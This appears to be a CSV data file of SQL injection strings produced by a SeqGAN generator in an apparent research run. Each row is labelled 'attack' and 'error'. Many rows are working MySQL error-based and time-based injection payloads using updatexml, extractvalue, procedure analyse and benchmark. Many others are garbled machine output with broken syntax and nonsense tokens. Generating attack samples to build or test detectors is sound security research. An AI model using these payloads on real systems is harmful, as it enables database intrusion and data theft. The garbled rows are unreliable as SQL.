attack,"1%""   )    )b  (  (  0x5c,(  (  =  2917,,1   (  case or updatexml  (  (  (  (  (  (  (  (  (  =  (  (  e  (  0x5c,  (  (  select   (  elt5704  =  9350  =  (  3393,1   from from dua  )  elt  (  elt  (  e  (  0x2e,  (  (  select   (  el  (  0x5c,  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  5000000(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '% ANDin%'  =  'q"" like ""kkprocincedure analyse  (  5847  (  5847  =  (  1808,concat  (  (  3393,concat  (  (  (  0x2e,md5  (  (  (  0x5c,  (  select   (  elt  (  0x2e,0x7171706a71,  (  --,  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  2917,concat  (  (  (  0x2e,mdu_namonadds   (    (    e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1795
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1796
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%5""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1797
attack,"1%""   )    )    FROM us   (  elt  (  elt  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e  (  1759  =  (  (  3393,1   (  4968 when   (  6166  (  (  (  1808  =  (  (  e  (  (  0x2e,md5  (  (  0x2e,md5  (  select   (  elt  (  2917  (  8421  (  e  (  1808,concat  (  (  (  (  select   (  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1798
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  'then%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1799
attack,"1%%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1800
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhnehgesmx",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1801
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""% procen FROM mnn(  e  (  0x2e,0x7171706a71,  (  5000000  (  (  select   (  elt  (  1297  =  (  (  9788  =  (  (  (  0x2e,0x7171706a71,  (  =  (  (  9627,concat  (  (  9393  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  0x4b774c75   (  1724  (  (  3393  )  (  (  (  (  0x2e,md5  (  1808,md5  (  3393  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1802
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1803
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'p""  =  ""%""  =  ""e)      )    (  extractvalue  (  (  (  5000000(  0x2e,0x7171706a71,  (  9627,md5  (  (  ut  (  benchmark  (  (  5000000(  0x2e,0x7171706a71,1   )    )  extractvalue  (  (  9627,concat  (  (  (  0x5c,(  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e  (  (  1759  =  (  (  1808,1   )    ual  )  select 0 from d (  (  elt  )  e  (  7982  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1804
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1805
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1806
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1807
attack,",mdu.yt_nehosest  (  2917  =  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000,md5  (  (  select   (  case when   (  4125  (  (  elt1 as inal  )  5000000,0x7171706a71(  (  benchmark  (  5000000,md5  (  (  select   (  elt  (  1759  =  (  (  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1808
attack,"1%""   )    6804  (  select   (  9103 and,2914  =  3393,  (  1759=  (  1808,1   )    (  extractvalue  (  (  7982,concat  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  =    (  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark    (  (  select   (  (  elte al  )  e  (  0x2e,concat  (  0x5c,0x7171706a71,  (  5000000,md5  (  (  select   (  case 0 0 from d",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1809
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1810
attack,"1%%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1811
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kNAncz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1812
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1813
attack,"  )  (  (  select   (  9103  (  (  (  (  0x2e,0x7171706a71,  (  select   (  3863  )   (  1724  (  5000000(  (  7982  =  extractvalue  (  3393,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  (  elt  (  3393  =  1559  (  (  (  e  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  3393,1   )    (  extractvalue  (  (  2917,md5  (  concat  (  (  7982",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1814
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1815
attack,"1%' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '     yroseewi",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1816
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1817
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1818
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'icA""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1819
attack,"%select   and updatexml  (  (  (  (  0x5c,(  (  benchmark  (  (  (  benchmark,  (  (  (    (  (  (  (  (  (  (  (  (  benchmark  (  (  (  5000000(  3393,md5  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  (  =  (  9627,1   (  US  )  select   (  )   from dualt  )  8375  )  )  =  (  1808,1   )    )     )  extractvalue  (  9627,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1820
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""oc   w    s0x717a767a71    xO,$'  =  '  --oban 4415 anal  ) when   (  6200  (  2917,1   )    (  select   (  case 0 from dua  elt  elt  (  case when   (  5777  (  1049,1   x  (  case from,md5  (    (  (  0x5c,0x7171706a71,  (  5000000(  (  select   (  elt  elt  (  5000000,md5  (  (  benchmark  (  (  (  0x5c,0x7171706a71,  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1821
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1822
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1823
attack," AND or updatexml  (  (  0x5c,  (  benchmark  (  (  (  benchmark  (  select   (  elt  (  elt  (  0x4b774c75   end  (  case 0 from d dual  )   end  (  case 1   then 5322 else else cast  (  (  (  (  (  0x2e=  1802  (  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt9393  )  2917  =  (  5000000(  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  5000000(  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1824
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1825
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1826
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1827
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1828
attack,"1%where where extractvalue  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  1808  =  (  5000000(  (  0x2e,0x7171706a71,  (  benchmarkt  (   (  (  case 0 from 0 from dua  el  elt   (  4660  (  0x5c,  (  select   (lt  (  elt  (  0x5c,  (  (  benchmark  (  (  9255,concat  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1829
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1830
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1831
attack,"1%"" or extractvalue  (  (  (  (  (  (  (  (  (   from   (  0 a  (  )  9627   (  (  case when   (  ual  )  )   end  (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  5000000(  (  1808=  (  (  0x5c,  (  select   (  3393,  (  (  0x2e,concat  (  (  caset  (  0x2e,0x7171706a71,  (  select   (  )    el    (  (  (  3393  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1832
attack,"select   (  8403  =  4415  =  3335  (  (  ( 0 a  )  case 6804   (  8375  (  (  benchmark  (  1297,1   )    AND 'i'  # )    #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1833
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1834
attack,"1%"" and extractvalue  (  (  (  (  (  (   SELECT 0 or 8860  =  extractvalue  (  (  9627,concat  (  (  (  3393  (  3393  (  (  3393,md5  (  1 1724  (  (  1808  =  (  1808,  (  (  =  (  (  (  2917  =  (  (  6212  =  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  e  (  8862  =  (  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  9083",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1835
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1836
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1837
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1838
attack,"1%pk'  =  'cpnnFROMndgh' like 'kqFROM in gzmnamonamedde   (    (   (  5704  (  1049  =  (  1808,1   )    (  extractvalue  (  (  select   (  1297,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  (    (  (    (  (  select   (  elt  (  elt  (  7982  =  (  (  0x2e,8666  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1839
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1840
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1841
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1842
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1843
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1844
attack,"1%""   and extractvalue  (  (  (  (  (  (  0x2e,0x7171706a71,(  (  (  (  (  (  (  select   (  )   (  3576  =  3393,md5  (  (  0x5c,  (  select   (  elt  e  (  (  1808  =  (  (  0x5c,  (  (  benchmark  (  (  5000000,md5  (  (  (  select   (  elt  (  0x2e,  (  (  (  select   (  elt  (  1759  =  (  5000000,0x717a767a71   (  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1845
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1846
attack,"1%""   )    AND 'i'  =  4102  =  2162  =  9338 or extractvalue  (  (  (  (  0x2e,0x7171706a71,  (  (  3393,1   (  )  select   (  )    3217  =  (  (  select   (  elt  (  1808  =  (  1808,concat  (  (  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  1297  =  (  3393,1   )    )  extractvalue  (  P(  (  (  3393,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1847
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1848
attack,"1%'  =  'kbb  e   (  4415  (  (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  (  2917  =  (  1808,1   (  extractvalue  (  3393,concat  (  (  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  0x5c,0x7171706a71,  (  5000000,md5  (  (  1759  (  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  l FROM 0 from(  )  (  (  5433  (  (  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1849
attack,"1%"" and updatexml  (  (  (  (  (  (  (  ((  (  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  (  (  0x52515a50   (  2446  (  2917)   end  (  (  (  elt  (  7982  =  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  (  7982  )  (  0x2e,(  (  (  8862  (  (  (  (  7982  =  3393,  (  select   (  case when   (  (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1850
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1851
attack,"1%""   or extractvalue  (  (  6212  =  utl  7982,1   )    (  extractvalue  (  1808,1   )    (  8862,md5  =  (  (  ,  (  select   (  8318  =  6212  (  5433   (  3681  (  (  (  0x5c,  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  extractvalue  (  benchmark  (  (  (  5000000(  (  (  case  =  (  (  0x5c,  (  79820x7171706a71,  (  benchmark  (  (  (  benchmark  (  5000000(  (  0x4b774c75   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1852
attack,"1%"",9338 and extractvalue  (  5  (  (  0x5c,0x7171706a71,6800  (  (  (  5000000(  (  (  (  select   (  elt  (  case when   (  (  case 0 from 0 from d5  (  8375  )   (  (  1354  (  =  3393,  (  benchmark  (  (  benchmarkupdatexml  (  (  (  1297,1   )    (  extractvalue  (  (  1049,  (  0x5c,0x7171706a71,  (  (  (  5000000,md5  (  1759(  mduaname  1812  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1853
attack,1%i,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1854
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1855
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1856
attack,"select   (  DI'i'  )  case when   (  (  7982,  (  select   ( 0 0 from dual  )   end  (  elt  elte  (  elt  (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x5c)  (  (  benchmark  (  (  2917,1   (  updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  1297  =  1049,md5  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1857
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1858
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1859
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1860
attack,"1 and extractvalue  (  (   (  (  case 0 ado  elt  (  1297,concat  (  =  3393,  (  (   (  (  (  1808,1   (  extractvalue  (  (  (  benchmark  (  5000000,md5  (  0x5c,0x7171706a71,  (  (  5000000=  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  (  9627,concat  (  (  3393,1   (  8083  )  case when   (  (  (  1049  =  (  0x5c,0x7171706a71,  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1861
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1862
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1863
attack,"1% and and updatexml  (  (  ,  (  select   (  elte  elt  (  1724    =  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  benchmark  (  (  (  9627,concat  (  (  (  0x5c,  (  (  select   (   (  (  4660  )   (  case 0     (  4415  =  (  1297,concat  (  (  (  3393,1   (  extractvalue  (  (  1297,0x7171706a71,  (  (  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1864
attack,"1%""   where 9338  =  1559 or extractvalue  )  (  (  (  (  1808,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  t  (    (  (  select   (  e  (  elt  (  elt  (  (  2917  =  =  5433  (  (  1808  =  (  (  1808  =  7982  (  (  7982,1   )    )  (  extractvalue  (  (  5000000,1   (  case 0 from dual  )  )   end  (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1865
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1866
attack,"1%"" where 2162  =  DUAL   )    AND 1559 extractvalue  (  3393,1   =  (  ut  elt  (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  select   (  el   (  (  0x5c,  (  (  select   (  elt  case   (  case inadd 9667   (  (  9103  )  (  0x4b774c75   (  4415  (  (  5000000,md5  (  (  8862  (  0x5c,  (  select   (  case   (  el  (  7982  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1867
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'ensdr""  =  ""e(s  (  select   (  elt  (  e  (  5000000(  (  (  select   (  3393  (  (  e  (  (  0x4b774c75   then 3217 else cast  (  (  (  select   (  elt  (  elt  (  7982  =  (  (  3393,1   )    (  extractvalue  (  9788,md5  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  (  elt  (  0x2e,md5  (  3393,md5  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1868
